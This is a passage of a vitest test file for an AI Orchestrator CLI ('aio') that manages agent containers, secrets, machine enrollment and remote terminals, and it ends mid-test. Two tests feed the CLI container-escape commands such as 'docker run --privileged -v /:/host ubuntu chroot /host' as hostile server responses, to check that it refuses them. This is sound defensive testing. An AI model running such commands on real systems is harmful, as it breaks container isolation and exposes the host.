// The aio CLI against a fake server.
import { EventEmitter } from "node:events";
import { mkdtempSync, readFileSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { PassThrough } from "node:stream";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { parseConfig } from "@aio/contracts";
import { childEnv, runCli } from "../src/program.js";
import type { TerminalIo } from "../src/terminal.js";
import type WebSocket from "ws";
import { startFakeServer, type FakeServer } from "./fake-server.js";
import {
  BOX_ID,
  CONTAINER,
  PROJECT_ID,
  RUN,
  boxView,
  engine,
  finding,
  imageStatus,
  job,
  project,
  projectSummary,
  roundSummary,
  runState,
  setupStatus,
  vendorUsage,
} from "./fixtures.js";

const TOKEN = "cli-test-token";
let server: FakeServer;
let home: string;
let out: string;
let err: string;
let execs: string[][];

beforeEach(async () => {
  server = await startFakeServer(TOKEN);
  home = mkdtempSync(path.join(tmpdir(), "aio-cli-"));
  // The CLI pins the certificate in the data directory, as the server writes it.
  mkdirSync(path.join(home, ".ai-orchestrator"));
  writeFileSync(path.join(home, ".ai-orchestrator", "server.crt"), server.cert);
  out = "";
  err = "";
  execs = [];
});
afterEach(async () => {
  await server.close();
  rmSync(home, { recursive: true, force: true });
});

function cli(
  args: string[],
  env: Record<string, string | undefined> = {},
  cwd?: string,
  signal?: AbortSignal,
) {
  return runCli(args, {
    cwd,
    signal,
    env: { AIO_SERVER: server.url, AIO_TOKEN: TOKEN, ...env },
    home,
    out: (t) => (out += t),
    err: (t) => (err += t),
    pollMs: 5,
    exec: async (argv) => {
      execs.push(argv);
      return 7;
    },
  });
}

const last = () => server.requests[server.requests.length - 1];

/** The argv the server returns to attach to a box's tmux session. */
const sessionArgv = () => [
  "docker",
  "exec",
  "-it",
  "--detach-keys=ctrl-],ctrl-]",
  CONTAINER,
  "bash",
  "-c",
  'for i in $(seq 1 300); do tmux has-session -t "=$1" 2>/dev/null && break; sleep 0.1; done; exec tmux attach -t "=$1"',
  "_",
  "main",
];
/** The argv the server returns to open a shell in a box. */
const shellArgv = () => [
  "docker",
  "exec",
  "-it",
  "-w",
  "/home/dev/project",
  CONTAINER,
  "bash",
  "-l",
];

describe("settings", () => {
  it("reads the token from ~/.ai-orchestrator/server.token and the port from config.json", async () => {
    writeFileSync(path.join(home, ".ai-orchestrator", "server.token"), `${TOKEN}\n`);
    const port = new URL(server.url).port;
    writeFileSync(
      path.join(home, ".ai-orchestrator", "config.json"),
      JSON.stringify({ serverPort: Number(port) }),
    );
    server.on("GET /api/v1/boxes", { body: { boxes: [] } });
    const code = await cli(["box", "list"], {
      AIO_SERVER: undefined,
      AIO_TOKEN: undefined,
    });
    expect(code).toBe(0);
    expect(last()?.authorization).toBe(`Bearer ${TOKEN}`);
  });

  it("reads the token and config.json from AIO_DATA_DIR when set", async () => {
    const dataDir = path.join(home, "data");
    mkdirSync(dataDir);
    writeFileSync(path.join(dataDir, "server.token"), `${TOKEN}\n`);
    writeFileSync(path.join(dataDir, "server.crt"), server.cert);
    writeFileSync(
      path.join(dataDir, "config.json"),
      JSON.stringify({ serverPort: Number(new URL(server.url).port) }),
    );
    server.on("GET /api/v1/boxes", { body: { boxes: [] } });
    const code = await cli(["box", "list"], {
      AIO_SERVER: undefined,
      AIO_TOKEN: undefined,
      AIO_DATA_DIR: dataDir,
    });
    expect(code).toBe(0);
    expect(last()?.authorization).toBe(`Bearer ${TOKEN}`);
  });

  it("reads only serverPort from config.json, so an unknown key keeps the port", async () => {
    writeFileSync(
      path.join(home, ".ai-orchestrator", "config.json"),
      JSON.stringify({ serverPort: Number(new URL(server.url).port), keyFromALaterBuild: true }),
    );
    server.on("GET /api/v1/boxes", { body: { boxes: [] } });
    expect(await cli(["box", "list"], { AIO_SERVER: undefined })).toBe(0);
    expect(server.requests).toHaveLength(1);
  });

  it("prefers the port the server wrote to server.port over config.json", async () => {
    writeFileSync(
      path.join(home, ".ai-orchestrator", "config.json"),
      JSON.stringify({ serverPort: 1 }),
    );
    writeFileSync(
      path.join(home, ".ai-orchestrator", "server.port"),
      `${new URL(server.url).port}\n`,
    );
    server.on("GET /api/v1/boxes", { body: { boxes: [] } });
    expect(await cli(["box", "list"], { AIO_SERVER: undefined })).toBe(0);
    expect(server.requests).toHaveLength(1);
  });

  it("takes the data directory from --data-dir, relative to the working directory", async () => {
    const dataDir = path.join(home, "service-data");
    mkdirSync(dataDir);
    writeFileSync(path.join(dataDir, "server.token"), `${TOKEN}\n`);
    writeFileSync(path.join(dataDir, "server.crt"), server.cert);
    writeFileSync(path.join(dataDir, "server.port"), new URL(server.url).port);
    server.on("GET /api/v1/boxes", { body: { boxes: [] } });
    const code = await cli(
      ["--data-dir", "service-data", "box", "list"],
      { AIO_SERVER: undefined, AIO_TOKEN: undefined, AIO_DATA_DIR: "/nonexistent" },
      home,
    );
    expect(code).toBe(0);
    expect(last()?.authorization).toBe(`Bearer ${TOKEN}`);
  });

  it("prefers --server over AIO_SERVER", async () => {
    server.on("GET /api/v1/boxes", { body: { boxes: [] } });
    expect(
      await cli(["--server", server.url, "box", "list"], {
        AIO_SERVER: "https://127.0.0.1:1",
      }),
    ).toBe(0);
  });

  it("explains a refused token", async () => {
    const code = await cli(["box", "list"], { AIO_TOKEN: "wrong" });
    expect(code).toBe(1);
    expect(err).toContain("refused the token");
  });

  it("explains an unreachable server", async () => {
    const code = await cli(["box", "list"], { AIO_SERVER: "https://127.0.0.1:1" });
    expect(code).toBe(1);
    expect(err).toMatch(/^Can't reach the AI Orchestrator server at https:\/\/127\.0\.0\.1:1: \S/);
    expect(err).toContain("ECONNREFUSED");
    expect(err).toContain("systemctl --user start aio-server");
  });

  it("names the cause of a failed global fetch", async () => {
    const failing = (async () => {
      throw Object.assign(new TypeError("fetch failed"), { cause: { code: "ECONNREFUSED" } });
    }) as unknown as typeof fetch;
    const code = await runCli(["box", "list"], {
      env: { AIO_SERVER: "https://example.com", AIO_TOKEN: TOKEN },
      home,
      out: (t) => (out += t),
      err: (t) => (err += t),
      fetch: failing,
    });
    expect(code).toBe(1);
    expect(err).toContain("at https://example.com: fetch failed (ECONNREFUSED)");
  });

  it("doesn't suggest starting the server when the certificate is the problem", async () => {
    writeFileSync(
      path.join(home, ".ai-orchestrator", "server.crt"),
      (await import("@aio/contracts/tls")).createServerIdentity().cert,
    );
    expect(await cli(["box", "list"])).toBe(1);
    expect(err).toMatch(/server\.crt/);
    expect(err).not.toContain("systemctl");
    err = "";
    rmSync(path.join(home, ".ai-orchestrator", "server.crt"));
    expect(await cli(["box", "list"])).toBe(1);
    expect(err).toMatch(/No server certificate/);
    expect(err).not.toContain("systemctl");
  });
});

describe("box", () => {
  it("lists boxes as a table, or JSON with --json", async () => {
    server.on("GET /api/v1/boxes", { body: { boxes: [boxView()] } });
    expect(await cli(["box", "list", "--project", PROJECT_ID])).toBe(0);
    expect(last()?.query).toEqual({ projectId: PROJECT_ID });
    expect(out.split("\n")[0]).toMatch(/^BOX\s+STATUS\s+REVIEW\s+PLATFORM/);
    expect(out).toContain(BOX_ID);
    out = "";
    await cli(["--json", "box", "list"]);
    expect(JSON.parse(out).boxes[0].box.id).toBe(BOX_ID);
  });

  it("creates a box and waits for the job", async () => {
    server.on("POST /api/v1/boxes", { status: 202, body: job("running") });
    let polls = 0;
    server.on("GET /api/v1/jobs/job-1", () => ({
      body: job(++polls < 2 ? "running" : "finished"),
    }));
    const code = await cli([
      "box",
      "new",
      "/home/user/src/example",
      "-n",
      "feature",
      "--layout",
      "worktree",
      "--effort",
      "high",
      "--ssh-remote",
      "staging",
    ]);
    expect(code).toBe(0);
    expect(server.requests.find((r) => r.method === "POST")?.body).toMatchObject({
      targetDir: "/home/user/src/example",
      conversationName: "feature",
      layout: "worktree",
      effort: "high",
      conversation: { mode: "new" },
      sshRemoteRefs: ["staging"],
      skipPermissions: true,
      start: true,
    });
    expect(out).toBe(`Created ${BOX_ID}.\n`);
  });

  it("adopts or forks a conversation and can skip waiting", async () => {
    server.on("POST /api/v1/boxes", { status: 202, body: job("running") });
    await cli([
      "box",
      "new",
      "/d",
      "--adopt",
      "0b9f2a7e-4c1d-4e8a-9f3b-2d6c8e1a5b70",
      "--no-wait",
      "--no-start",
    ]);
    expect(last()?.body).toMatchObject({
      conversation: { mode: "adopt", sessionUuid: "0b9f2a7e-4c1d-4e8a-9f3b-2d6c8e1a5b70" },
      start: false,
    });
    expect(out).toContain("job job-1");
    await cli(["box", "new", "/d", "--fork", BOX_ID, "--no-wait"]);
    expect(last()?.body).toMatchObject({ conversation: { mode: "fork", fromBoxId: BOX_ID } });
    expect(await cli(["box", "new", "/d", "--fork", BOX_ID, "--adopt", "x"])).toBe(2);
  });

  it("reports a failed creation job", async () => {
    server.on("POST /api/v1/boxes", { status: 202, body: job("failed") });
    expect(await cli(["box", "new", "/d"])).toBe(1);
    expect(err).toContain("Build the image first.");
  });

  it("validates the body before sending it", async () => {
    expect(await cli(["box", "new", "/d", "--layout", "worktree", "--no-wait"])).toBe(2);
    expect(server.requests).toHaveLength(0);
    expect(err).toContain("conversation name");
    expect(err.trim().split("\n")).toHaveLength(1);
    err = "";
    expect(await cli(["box", "new", "/d", "--adopt", "notauuid"])).toBe(2);
    expect(err).toMatch(/^Invalid body: conversation\.sessionUuid: Invalid uuid\.\n$/);
    expect(server.requests).toHaveLength(0);
  });

  it("stops polling its job and exits 130 when interrupted", async () => {
    server.on("POST /api/v1/boxes", { status: 202, body: job("running") });
    const controller = new AbortController();
    let polls = 0;
    server.on("GET /api/v1/jobs/job-1", () => {
      if (++polls === 2) controller.abort();
      return { body: job("running") };
    });
    expect(await cli(["box", "new", "/d"], {}, undefined, controller.signal)).toBe(130);
    expect(err).toBe("Interrupted.\n");
    expect(polls).toBe(2);
  });

  it("refuses an ID that URL parsing would turn into another route", async () => {
    for (const id of ["..", "."]) {
      expect(await cli(["box", "stop", id])).toBe(2);
    }
    expect(err).toMatch(/Invalid path parameter "boxId"/);
    expect(server.requests).toHaveLength(0);
  });

  it("starts a box with --force, and opens one the same way", async () => {
    server.on(`POST /api/v1/boxes/${BOX_ID}/start`, { body: boxView("running") });
    expect(await cli(["box", "start", BOX_ID, "--force"])).toBe(0);
    expect(last()?.body).toEqual({ force: true });
    expect(await cli(["box", "start", BOX_ID])).toBe(0);
    expect(last()?.body).toEqual({ force: false });
    server.on(`GET /api/v1/boxes/${BOX_ID}`, { body: boxView("stopped") });
    server.on(`GET /api/v1/boxes/${BOX_ID}/attach-command`, { body: { argv: sessionArgv() } });
    expect(await cli(["box", "open", BOX_ID, "--force"])).toBe(7);
    expect(server.requests.filter((r) => r.path.endsWith("/start")).at(-1)?.body).toEqual({
      force: true,
    });
  });

  it("starts, stops, and restarts a box", async () => {
    for (const verb of ["start", "stop", "restart"]) {
      server.on(`POST /api/v1/boxes/${BOX_ID}/${verb}`, {
        body: boxView(verb === "stop" ? "stopped" : "running"),
      });
      out = "";
      expect(await cli(["box", verb, BOX_ID])).toBe(0);
      expect(out).toBe(`${BOX_ID} is ${verb === "stop" ? "stopped" : "running"}.\n`);
    }
  });

  it("passes server errors through with their code", async () => {
    server.on(`POST /api/v1/boxes/${BOX_ID}/start`, {
      status: 409,
      body: { error: { code: "box_running", message: "The box is running." } },
    });
    expect(await cli(["box", "start", BOX_ID])).toBe(1);
    expect(err).toBe("Error (box_running): The box is running.\n");
  });

  it("removes a box, with its worktree on request", async () => {
    server.on(`DELETE /api/v1/boxes/${BOX_ID}`, {
      body: { removed: true, worktree: "removed", reason: null },
    });
    await cli(["box", "remove", BOX_ID, "--remove-worktree"]);
    expect(last()?.query).toEqual({ removeWorktree: "true" });
    expect(out).toContain("Worktree: removed");
  });

  it("purges only with --yes", async () => {
    expect(await cli(["box", "purge", BOX_ID])).toBe(2);
    expect(server.requests).toHaveLength(0);
    server.on(`POST /api/v1/boxes/${BOX_ID}/purge`, {
      body: { removedRecords: [BOX_ID], removedTranscriptDirs: ["/x"], dryRun: false },
    });
    expect(await cli(["box", "purge", BOX_ID, "--yes"])).toBe(0);
    expect(last()?.body).toEqual({ dryRun: false });
    expect(out).toContain("Removed 1 records and 1 transcript directories.");
  });

  it("previews a purge with --dry-run and no --yes", async () => {
    server.on(`POST /api/v1/boxes/${BOX_ID}/purge`, {
      body: { removedRecords: [BOX_ID], removedTranscriptDirs: [], dryRun: true },
    });
    expect(await cli(["box", "purge", BOX_ID, "--dry-run"])).toBe(0);
    expect(last()?.body).toEqual({ dryRun: true });
    expect(out).toContain("Would remove 1 records and 0 transcript directories.");
  });

  it("attaches through the server's attach command", async () => {
    server.on(`GET /api/v1/boxes/${BOX_ID}/attach-command`, {
      body: { argv: sessionArgv() },
    });
    expect(await cli(["box", "attach", BOX_ID])).toBe(7);
    expect(last()?.query).toEqual({ kind: "session" });
    expect(execs[0]?.[0]).toBe("docker");
    await cli(["box", "attach", BOX_ID, "--side", "codex"]);
    expect(last()?.query).toEqual({ kind: "side", platform: "codex" });
    await cli(["box", "shell", BOX_ID]);
    expect(last()?.query).toEqual({ kind: "shell" });
  });

  it("opens a stopped box by starting it first", async () => {
    server.on(`GET /api/v1/boxes/${BOX_ID}`, { body: boxView("stopped") });
    server.on(`POST /api/v1/boxes/${BOX_ID}/start`, { body: boxView("running") });
    server.on(`GET /api/v1/boxes/${BOX_ID}/attach-command`, {
      body: { argv: sessionArgv() },
    });
    expect(await cli(["box", "open", BOX_ID])).toBe(7);
    expect(server.requests.map((r) => `${r.method} ${r.path}`)).toEqual([
      `GET /api/v1/boxes/${BOX_ID}`,
      `GET /api/v1/boxes/${BOX_ID}/attach-command`,
      `POST /api/v1/boxes/${BOX_ID}/start`,
      `GET /api/v1/boxes/${BOX_ID}/attach-command`,
    ]);
  });

  it("leaves a stopped box stopped when it refuses the attach command", async () => {
    server.on(`GET /api/v1/boxes/${BOX_ID}`, { body: boxView("stopped") });
    server.on(`POST /api/v1/boxes/${BOX_ID}/start`, { body: boxView("running") });
    server.on(`GET /api/v1/boxes/${BOX_ID}/attach-command`, {
      body: { argv: ["docker", "run", "--privileged", "-v", "/:/host", "ubuntu"] },
    });
    expect(await cli(["box", "open", BOX_ID])).toBe(2);
    expect(err).toMatch(/isn't one the CLI runs/);
    expect(execs).toEqual([]);
    expect(server.requests.map((r) => `${r.method} ${r.path}`)).not.toContain(
      `POST /api/v1/boxes/${BOX_ID}/start`,
    );
  });

  it("runs no docker command outside the attach shapes", async () => {
    const hostile = [
      ["docker", "run", "--privileged", "-v", "/:/host", "ubuntu", "chroot", "/host"],
      ["docker", "exec", "--privileged", "-it", CONTAINER, "bash", "-l"],
      ["docker", "exec", "-it", "-w", "/w", "-v", "/:/host", CONTAINER, "bash", "-l"],
    ];
    for (const argv of hostile) {
      server.on(`GET /api/v1/boxes/${BOX_ID}/attach-command`, { body: { argv } });
      err = "";
      expect(await cli(["box", "attach", BOX_ID]), argv.join(" ")).toBe(2);
      expect(err).toMatch(/runs only docker exec into a box container/);
    }
    expect(execs).toEqual([]);
  });

  it("sends a message", async () => {
    server.on(`POST /api/v1/boxes/${BOX_ID}/message`, { body: { ok: true } });
    expect(await cli(["box", "message", BOX_ID, "Hold", "edits"])).toBe(0);
    expect(last()?.body).toEqual({ text: "Hold edits" });
  });
});

describe("secrets", () => {
  it("lists the available fields and passes --refresh", async () => {
    server.on("GET /api/v1/secrets/available", {
      body: {
        vaults: ["Aio"],
        candidates: [
          {
            vault: "Aio",
            item: "Token GitHub",
            itemId: "i1",
            field: "credential",
            type: "CONCEALED",
            ref: "op://Aio/Token GitHub/credential",
            suggestedName: "TOKEN_GITHUB_CREDENTIAL",
          },
        ],
        vaultErrors: [{ vault: "Old", message: "Can't list vault Old" }],
        fetchedAt: "2026-10-28T09:00:00Z",
      },
    });
    await cli(["secrets", "available", "--refresh"]);
    expect(last()?.query).toEqual({ refresh: "true" });
    expect(out).toContain("TOKEN_GITHUB_CREDENTIAL");
    expect(out).toContain("op://Aio/Token GitHub/credential");
    expect(out).toContain("Old: Can't list vault Old");
  });
});

describe("machines and node", () => {
  const nodeStatus = {
    role: "node",
    name: "node-one",
    machineId: "m1",
    hubUrl: "https://hub.example.com:21402",
    link: "connecting",
    error: null,
    linkPort: null,
  };

  it("lists, enrolls, and revokes machines", async () => {
    server.on("GET /api/v1/machines", {
      body: {
        machines: [
          {
            id: "local",
            name: "desk",
            role: "both",
            status: "online",
            isLocal: true,
            serverVersion: "1.0.0",
            protocol: 1,
            capabilities: [],
            lastSeen: "2026-11-01T10:00:00Z",
            platform: "linux",
          },
          {
            id: "m1",
            name: "node-one",
            role: "node",
            status: "offline",
            isLocal: false,
            serverVersion: null,
            protocol: null,
            capabilities: [],
            lastSeen: null,
            platform: null,
          },
        ],
      },
    });
    await cli(["machines", "list"]);
    expect(out.split("\n")[0]).toMatch(/^ID\s+NAME\s+ROLE\s+STATUS/);
    expect(out).toContain("local (this machine)");
    expect(out).toMatch(/m1\s+node-one\s+node\s+offline/);

    out = "";
    server.on("POST /api/v1/machines/enrollment-codes", {
      status: 201,
      body: {
        code: "7K2Q-M9XD-4HPA-R3TB",
        expiresAt: "2026-11-01T10:10:00Z",
        hubUrl: "https://hub.example.com:21402",
      },
    });
    await cli(["machines", "enroll"]);
    expect(out).toContain("Enrollment code: 7K2Q-M9XD-4HPA-R3TB");
    expect(out).toMatch(/aio node join https:\/\/hub\.example\.com:21402\n/);

    server.on("DELETE /api/v1/machines/m1", { body: { ok: true } });
    await cli(["machines", "revoke", "m1"]);
    expect(last()?.method).toBe("DELETE");
    expect(out).toContain("Revoked m1.");
  });

  function joinCli(args: string[], input: TerminalIo["input"]) {
    return runCli(["node", "join", ...args], {
      env: { AIO_SERVER: server.url, AIO_TOKEN: TOKEN },
      home,
      out: (t) => (out += t),
      err: (t) => (err += t),
      terminal: { input, output: { write: () => true } },
    });
  }

  it("joins a hub and shows the link", async () => {
    server.on("POST /api/v1/node/join", { body: nodeStatus });
    const input = new PassThrough();
    input.end("7K2Q-M9XD-4HPA-R3TB\n");
    await joinCli(["https://hub.example.com:21402", "--name", "node-one"], input);
    expect(err).toBe("");
    expect(last()?.body).toEqual({
      hubUrl: "https://hub.example.com:21402",
      code: "7K2Q-M9XD-4HPA-R3TB",
      name: "node-one",
    });
    expect(out).toContain("Joined https://hub.example.com:21402 as node-one (m1).");

    out = "";
    server.on("GET /api/v1/node", { body: nodeStatus });
    await cli(["node", "status"]);
    expect(out).toMatch(/Link:\s+connecting/);
  });

  it("asks to replace the hub only with --replace-hub", async () => {
    server.on("POST /api/v1/node/join", { body: nodeStatus });
    const input = new PassThrough();
    input.end("7K2Q-M9XD-4HPA-R3TB\n");
    await joinCli(["https://hub.example.com:21402", "--replace-hub"], input);
    expect(last()?.body).toEqual({
      hubUrl: "https://hub.example.com:21402",
      code: "7K2Q-M9XD-4HPA-R3TB",
      replaceHub: true,
    });
  });

  it("shows the hub's reason when the hub refuses the enrollment code", async () => {
    const message = "The hub refused the enrollment: Issue a new code on the hub.";
    server.on("POST /api/v1/node/join", {
      status: 403,
      body: { error: { code: "unauthorized", message } },
    });
    const input = new PassThrough();
    input.end("7K2Q-M9XD-4HPA-R3TB\n");
    expect(await joinCli(["https://hub.example.com:21402"], input)).not.toBe(0);
    expect(err).toContain(message);
    expect(err).not.toContain("server.token");
  });

  /** A terminal's keyboard, in raw mode or not. */
  const keyboard = () => {
    const rawModes: boolean[] = [];
    const input = Object.assign(new PassThrough(), {
      isTTY: true,
      setRawMode(raw: boolean) {
        rawModes.push(raw);
      },
    });
    return { input, rawModes };
  };

  it("prompts for the enrollment code on a terminal without showing it", async () => {
    server.on("POST /api/v1/node/join", { body: nodeStatus });
    const { input, rawModes } = keyboard();
    const joined = joinCli(["https://hub.example.com:21402"], input);
    input.write("7K2Q-M9XD-4HPA-XX\x7f\x7fR3TB\r");
    expect(await joined).toBe(0);
    expect(last()?.body).toEqual({
      hubUrl: "https://hub.example.com:21402",
      code: "7K2Q-M9XD-4HPA-R3TB",
    });
    expect(rawModes).toEqual([true, false]);
    expect(err).toBe("Enrollment code: \n");
    expect(out).not.toContain("7K2Q");
  });

  it("stops at Ctrl+C in the prompt without joining", async () => {
    const { input, rawModes } = keyboard();
    const joined = joinCli(["https://hub.example.com:21402"], input);
    input.write("7K2Q\x03");
    expect(await joined).toBe(130);
    expect(rawModes).toEqual([true, false]);
    expect(server.requests).toEqual([]);
  });

  it("refuses an empty enrollment code", async () => {
    const input = new PassThrough();
    input.end("");
    expect(await joinCli(["https://hub.example.com:21402"], input)).toBe(2);
    expect(err).toContain("Enter the enrollment code");
    expect(server.requests).toEqual([]);
  });

  it("refuses an enrollment code on the command line", async () => {
    const input = new PassThrough();
    input.end("");
    const args = ["https://hub.example.com:21402", "7K2Q-M9XD-4HPA-R3TB"];
    expect(await joinCli(args, input)).toBe(2);
    expect(err).not.toContain("7K2Q");
    expect(server.requests).toEqual([]);
  });
});

describe("box attach on another machine", () => {
  const machine = (id: string, name: string, isLocal: boolean) => ({
    id,
    name,
    role: isLocal ? "both" : "node",
    status: "online",
    isLocal,
    serverVersion: "1.0.0",
    protocol: 1,
    capabilities: [],
    lastSeen: null,
    platform: "linux",
  });

  /** A terminal double: keys the test types, a screen it reads, and a size it changes. */
  function fakeTerminal() {
    const input = Object.assign(new PassThrough(), {
      isTTY: true,
      rawModes: [] as boolean[],
      setRawMode(raw: boolean) {
        input.rawModes.push(raw);
      },
    });
    const output = Object.assign(new EventEmitter(), {
      columns: 100,
      rows: 30,
      screen: [] as Buffer[],
      write(data: Uint8Array | string) {
        output.screen.push(Buffer.from(data));
      },
    });
    return { input, output };
  }

  /** Records what a terminal socket receives. */
  function serveTerminal(script: (ws: WebSocket, got: (Buffer | string)[]) => void) {
    const seen: { path: string; query: Record<string, string>; got: (Buffer | string)[] } = {
      path: "",
      query: {},
      got: [],
    };
    const closes: { code: number; reason: string }[] = [];
    server.onTerminal = (ws, url) => {
      seen.path = url.pathname;
      seen.query = Object.fromEntries(url.searchParams);
      ws.on("message", (data, isBinary) =>
        seen.got.push(isBinary ? Buffer.from(data as Buffer) : data.toString()),
      );
      ws.on("close", (code, reason) => closes.push({ code, reason: reason.toString() }));
      script(ws, seen.got);
    };
    return { seen, closes };
  }

  function attachCli(args: string[], terminal: ReturnType<typeof fakeTerminal>) {
    return runCli(args, {
      env: { AIO_SERVER: server.url, AIO_TOKEN: TOKEN },
      home,
      out: (t) => (out += t),
      err: (t) => (err += t),
      exec: async (argv) => {
        execs.push(argv);
        return 7;
      },
      terminal,
    });
  }

  const until = async (predicate: () => boolean) => {
    for (let i = 0; i < 400 && !predicate(); i += 1) await new Promise((r) => setTimeout(r, 5));
    expect(predicate()).toBe(true);
  };

  beforeEach(() => {
    server.on("GET /api/v1/machines", {
      body: { machines: [machine("local", "desk", true), machine("m1", "node-one", false)] },
    });
  });

  it("relays keys, output, and resizes, and exits with the box's exit code", async () => {
    const terminal = fakeTerminal();
    const { seen } = serveTerminal((ws, got) => {
      ws.send(JSON.stringify({ type: "ready", terminalId: "t1" }));
      ws.send(Buffer.from([0x1b, 0x5b, 0x48, 0xff]), { binary: true });
      const timer = setInterval(() => {
        if (got.some((g) => typeof g === "string" && g.includes("resize"))) {
          clearInterval(timer);
          ws.send(JSON.stringify({ type: "exit", exitCode: 3 }));
          ws.close(1000, "ended");
        }
      }, 5);
    });
    const done = attachCli(["box", "attach", "node-one/" + BOX_ID], terminal);
    await until(() => terminal.output.screen.length > 0);
    terminal.input.write(Buffer.from("ls\r"));
    await until(() => seen.got.length === 1);
    terminal.output.columns = 120;
    terminal.output.rows = 40;
    terminal.output.emit("resize");
    expect(await done).toBe(3);

    expect(seen.path).toBe("/api/v1/machines/m1/proxy/terminals");
    expect(seen.query).toEqual({ kind: "session", boxId: BOX_ID, cols: "100", rows: "30" });
    expect(seen.got[0]).toEqual(Buffer.from("ls\r"));
    expect(JSON.parse(seen.got[1] as string)).toEqual({ type: "resize", cols: 120, rows: 40 });
    expect([...Buffer.concat(terminal.output.screen)]).toEqual([0x1b, 0x5b, 0x48, 0xff]);
    expect(terminal.input.rawModes).toEqual([true, false]);
    expect(err).toContain("Ctrl+] twice");
    expect(execs).toEqual([]);
  });

  it("detaches on Ctrl+] twice and leaves the box running", async () => {
    const terminal = fakeTerminal();
    const { seen, closes } = serveTerminal((ws) =>
      ws.send(JSON.stringify({ type: "ready", terminalId: "t1" })),
    );
    const done = attachCli(["box", "shell", "m1/" + BOX_ID], terminal);
    await until(() => err.includes("Attached"));
    // One Ctrl+] alone passes through with the next key.
    terminal.input.write(Buffer.from([0x1d, 0x61]));
    await until(() => seen.got.length === 1);
    terminal.input.write(Buffer.from([0x1d]));
    terminal.input.write(Buffer.from([0x1d]));
    expect(await done).toBe(0);
    await until(() => closes.length === 1);
    expect(seen.query).toMatchObject({ kind: "shell", boxId: BOX_ID });
    expect(seen.got).toEqual([Buffer.from([0x1d, 0x61])]);
    expect(closes[0]).toEqual({ code: 1000, reason: "detached" });
    expect(err).toContain("Detached. The box keeps running.");
    expect(terminal.input.rawModes).toEqual([true, false]);
  });

  it("reports the server's refusal and a dropped connection", async () => {
    const terminal = fakeTerminal();
    server.refuseTerminal = {
      status: 503,
      body: { error: { code: "machine_offline", message: "Machine m1 is offline." } },
    };
    expect(await attachCli(["box", "attach", "m1/" + BOX_ID, "--side", "codex"], terminal)).toBe(1);
    expect(err).toContain("Error (machine_offline): Machine m1 is offline.");

    server.refuseTerminal = null;
    err = "";
    const { seen } = serveTerminal((ws) => {
      ws.send(JSON.stringify({ type: "ready", terminalId: "t1" }));
      setTimeout(() => ws.close(1014, "The link to machine m1 closed."), 20);
    });
    expect(await attachCli(["box", "attach", "m1/" + BOX_ID, "--side", "codex"], terminal)).toBe(1);
    expect(seen.query).toMatchObject({ kind: "side", platform: "codex" });
    expect(err).toContain("The link to machine m1 closed.");
    expect(terminal.input.rawModes).toEqual([true, false]);
  });

  it("attaches locally for this machine and refuses an unknown one", async () => {
    server.on(`GET /api/v1/boxes/${BOX_ID}/attach-command`, { body: { argv: sessionArgv() } });
    const terminal = fakeTerminal();
    expect(await attachCli(["box", "attach", "desk/" + BOX_ID], terminal)).toBe(7);
    expect(execs).toHaveLength(1);
    expect(await attachCli(["box", "attach", "nowhere/" + BOX_ID], terminal)).toBe(2);
    expect(err).toContain("No machine has the ID or name nowhere.");
    expect(await attachCli(["box", "attach", "m1/"], terminal)).toBe(2);
    expect(await attachCli(["box", "open", "m1/" + BOX_ID], terminal)).toBe(2);
    expect(err).toContain("aio box attach MACHINE/BOX");
  });
});

describe("project", () => {
  it("lists and shows projects", async () => {
    server.on("GET /api/v1/projects", { body: { projects: [projectSummary] } });
    await cli(["project", "list"]);
    expect(out).toContain(PROJECT_ID);
    expect(out).toContain(`${CONTAINER} (running)`);
    server.on(`GET /api/v1/projects/${PROJECT_ID}`, { body: projectSummary });
    out = "";
    await cli(["project", "show", PROJECT_ID]);
    expect(out).toContain("Secrets:");
    expect(out).toContain("API_TOKEN");
    expect(out).not.toContain("op://");
    expect(out).not.toContain("stale");
  });

  it("flags a container that runs with old settings", async () => {
    const stale = {
      ...projectSummary,
      container: { ...projectSummary.container, stale: ["secrets environment -> broker"] },
    };
    server.on("GET /api/v1/projects", { body: { projects: [stale] } });
    await cli(["project", "list"]);
    expect(out).toContain(`${CONTAINER} (running, stale)`);
    server.on(`GET /api/v1/projects/${PROJECT_ID}`, { body: stale });
    out = "";
    await cli(["project", "show", PROJECT_ID]);
    expect(out).toMatch(/Stale: +secrets environment -> broker/);
  });

  it("changes settings and reports stale boxes", async () => {
    server.on(`PATCH /api/v1/projects/${PROJECT_ID}`, { body: { project, staleBoxes: [BOX_ID] } });
    await cli([
      "project",
      "set",
      PROJECT_ID,
      "--name",
      "Example",
      "--tcp-map",
      "18080:8080",
      "--tcp-map",
      "9000",
      "--mount",
      "/srv/data",
      "--clear-ceilings",
    ]);
    expect(last()?.body).toEqual({
      name: "Example",
      tcpMaps: [
        { host: 18080, container: 8080 },
        { host: 9000, container: 9000 },
      ],
      mounts: [{ host: "/srv/data", container: "/srv/data" }],
      ceilingsOverride: null,
    });
    expect(out).toContain(`Restart the container to apply the change to: ${BOX_ID}`);
  });

  it("refuses an empty or invalid change", async () => {
    expect(await cli(["project", "set", PROJECT_ID])).toBe(2);
    expect(await cli(["project", "set", PROJECT_ID, "--tcp-map", "x:1"])).toBe(2);
    expect(await cli(["project", "set", PROJECT_ID, "--tcp-map", "80:90:100"])).toBe(2);
    expect(await cli(["project", "set", PROJECT_ID, "--mount", "/srv", "--clear-mounts"])).toBe(2);
    expect(await cli(["project", "set", PROJECT_ID, "--tcp-map", "80", "--clear-tcp-maps"])).toBe(
      2,
    );
    expect(
      await cli(["project", "set", PROJECT_ID, "--primary-repo", "/r", "--clear-primary-repo"]),
    ).toBe(2);
    expect(err).toContain("Use --primary-repo or --clear-primary-repo, not both.");
    expect(server.requests).toHaveLength(0);
  });

  it("restarts a project's container and reports each box", async () => {
    server.on(`POST /api/v1/projects/${PROJECT_ID}/container/restart`, {
      body: {
        done: [BOX_ID],
        failed: [{ boxId: "aio-agent-other", error: { code: "internal", message: "No." } }],
      },
    });
    expect(await cli(["project", "restart", PROJECT_ID])).toBe(1);
    expect(out).toContain(`Started again: ${BOX_ID}.`);
    expect(out).toContain("Failed aio-agent-other: No.");
  });
});

describe("review", () => {
  it("starts a run from a box", async () => {
    server.on(`GET /api/v1/boxes/${BOX_ID}`, { body: boxView() });
    server.on("POST /api/v1/runs", { status: 201, body: runState });
    expect(
      await cli(["review", "start", "--box", BOX_ID, "--profile", "fast", "--exact-base"]),
    ).toBe(0);
    expect(last()?.body).toMatchObject({
